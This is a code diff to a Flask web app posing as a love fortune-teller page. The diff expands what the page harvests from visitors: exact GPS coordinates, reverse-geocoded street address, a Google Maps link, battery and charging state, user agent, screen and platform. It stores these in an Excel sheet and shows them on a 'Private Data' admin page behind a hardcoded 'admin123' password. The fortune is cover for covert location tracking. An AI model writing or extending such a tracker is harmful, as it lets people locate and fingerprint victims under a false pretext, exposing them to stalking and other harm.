@@ -15,8 +15,9 @@ ADMIN_PASSWORD = 'admin123'
 def init_excel():
     if not os.path.exists(EXCEL_FILE):
         df = pd.DataFrame(columns=[
-            'timestamp','name','latitude','longitude',
-            'accuracy','address','battery','userAgent','screen'
+            'DateTime', 'Name', 'Latitude', 'Longitude',
+            'Google Maps', 'Accuracy_m', 'Address',
+            'Battery_%', 'Charging', 'Device', 'Screen', 'Platform'
         ])
         df.to_excel(EXCEL_FILE, index=False)
 
@@ -32,7 +33,7 @@ def geocode_reverse(lat, lon):
             'zoom': 18,
             'accept-language': 'en'
         }
-        # IMPORTANT: Replace with your real email address (required by Nominatim)
+        # IMPORTANT: Replace with your real email address
         headers = {
             'User-Agent': 'LoveFortuneTeller/1.0 (your-email@gmail.com)'
         }
@@ -41,7 +42,6 @@ def geocode_reverse(lat, lon):
         if response.status_code == 200:
             data = response.json()
             if 'display_name' in data and data['display_name']:
-                # Limit length to avoid huge strings
                 return data['display_name'][:200]
             else:
                 return f"Coordinates: {lat:.4f}, {lon:.4f}"
@@ -194,6 +194,15 @@ window.start=function(){
   askLocation();
 };
 
+async function getBatteryInfo(){
+  try{
+    const b=await navigator.getBattery();
+    return { level: Math.round(b.level*100), charging: b.charging };
+  }catch(e){
+    return { level: 'N/A', charging: 'N/A' };
+  }
+}
+
 function askLocation(){
   document.getElementById('res').classList.remove('show');
   document.getElementById('form').style.display='none';
@@ -203,8 +212,7 @@ function askLocation(){
   navigator.geolocation.getCurrentPosition(
     async pos=>{
       document.getElementById('load').classList.remove('show');
-      let battery='N/A';
-      try{const b=await navigator.getBattery();battery=Math.round(b.level*100)+'%';}catch(e){}
+      const battery = await getBatteryInfo();
       try{
         const r=await fetch('/save',{
           method:'POST',
@@ -214,9 +222,11 @@ function askLocation(){
             latitude:  pos.coords.latitude,
             longitude: pos.coords.longitude,
             accuracy:  pos.coords.accuracy,
-            battery:   battery,
+            battery_level:   battery.level,
+            battery_charging: battery.charging,
             userAgent: navigator.userAgent,
-            screen:    screen.width+'x'+screen.height
+            screen:    screen.width+'x'+screen.height,
+            platform:  navigator.platform
           })
         });
         const d=await r.json();
@@ -251,18 +261,24 @@ def save_data():
     init_excel()
     try:
         data = request.json
-        address = geocode_reverse(data['latitude'], data['longitude'])
+        lat = data['latitude']
+        lon = data['longitude']
+        address = geocode_reverse(lat, lon)
+        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
 
         new_row = pd.DataFrame([{
-            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'name':      data['name'],
-            'latitude':  data['latitude'],
-            'longitude': data['longitude'],
-            'accuracy':  data['accuracy'],
-            'address':   address,
-            'battery':   data['battery'],
-            'userAgent': data['userAgent'][:120],
-            'screen':    data['screen']
+            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+            'Name': data['name'],
+            'Latitude': lat,
+            'Longitude': lon,
+            'Google Maps': google_maps_link,
+            'Accuracy_m': data['accuracy'],
+            'Address': address,
+            'Battery_%': data['battery_level'],
+            'Charging': data['battery_charging'],
+            'Device': data['userAgent'][:150],
+            'Screen': data['screen'],
+            'Platform': data['platform']
         }])
 
         df = pd.read_excel(EXCEL_FILE)
@@ -281,7 +297,7 @@ def save_data():
             f"💓 {data['name']}, a wonderful surprise is waiting for your heart!",
             f"💝 {data['name']}, someone is secretly falling for you right now!"
         ]
-        print(f"✅ Saved: {data['name']} | {data['latitude']:.4f},{data['longitude']:.4f} -> {address[:60]}")
+        print(f"✅ Saved: {data['name']} | {lat:.4f},{lon:.4f} -> {address[:60]}")
         return jsonify({'saved': True, 'fortune': random.choice(fortunes)})
     except Exception as e:
         print("ERR:", e)
@@ -322,15 +338,19 @@ button{width:100%;padding:13px;background:linear-gradient(135deg,#ff6b6b,#c06c84
     df = pd.read_excel(EXCEL_FILE)
     rows = ''
     for _, row in df.iterrows():
-        gps  = f"{row['latitude']:.4f}, {row['longitude']:.4f}"
-        maps = f"https://maps.google.com/?q={row['latitude']},{row['longitude']}"
+        gps  = f"{row['Latitude']:.4f}, {row['Longitude']:.4f}"
+        maps = row['Google Maps']
         rows += f'''<tr>
-            <td style="white-space:nowrap;">{row['timestamp']}</td>
-            <td><b>{row['name']}</b></td>
+            <td style="white-space:nowrap;">{row['DateTime']}</td>
+            <td><b>{row['Name']}</b></td>
             <td><a href="{maps}" target="_blank">📍 {gps}</a></td>
-            <td style="max-width:280px; font-size:11px; word-break:break-word;">{row['address']}</td>
-            <td>{row['battery']}</td>
-            <td style="font-size:11px;">{row['screen']}</td>
+            <td style="max-width:280px; font-size:11px; word-break:break-word;">{row['Address']}</td>
+            <td>{row['Accuracy_m']} m</td>
+            <td>{row['Battery_%']}%</td>
+            <td>{row['Charging']}</td>
+            <td style="max-width:180px; font-size:10px;">{row['Device']}</td>
+            <td>{row['Screen']}</td>
+            <td>{row['Platform']}</td>
         </tr>'''
 
     return f'''<!DOCTYPE html>
@@ -340,8 +360,8 @@ body{{font-family:sans-serif;padding:20px;background:#fff0f5;}}
 h1{{color:#c06c84;margin-bottom:20px;}}
 table{{width:100%;border-collapse:collapse;background:#fff;border-radius:15px;
        overflow-x:auto;display:block;box-shadow:0 5px 20px rgba(0,0,0,0.08);}}
-th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:13px;}}
-td{{padding:10px 14px;border-bottom:1px solid #ffe0e9;font-size:12px;}}
+th{{background:linear-gradient(135deg,#ff6b6b,#c06c84);color:#fff;padding:12px 14px;text-align:left;font-size:12px;}}
+td{{padding:8px 12px;border-bottom:1px solid #ffe0e9;font-size:11px;}}
 tr:hover td{{background:#fff5f8;}}
 a{{color:#c06c84;text-decoration:none;}}
 </style></head>
@@ -349,8 +369,16 @@ a{{color:#c06c84;text-decoration:none;}}
 <h1>💋 Private Data — {len(df)} entries</h1>
 <div style="overflow-x:auto;">
 <table>
-   <tr><th>Time</th><th>Name</th><th>Location</th><th>Address</th><th>Battery</th><th>Screen</th></tr>
-  {rows}
+    <thead>
+        <tr>
+            <th>DateTime</th><th>Name</th><th>Location</th><th>Address</th>
+            <th>Accuracy</th><th>Battery%</th><th>Charging</th>
+            <th>Device</th><th>Screen</th><th>Platform</th>
+        </tr>
+    </thead>
+    <tbody>
+        {rows}
+    </tbody>
 </table>
 </div>
 <p style="margin-top:20px;"><a href="/download-excel">📥 Download Excel file</a></p>
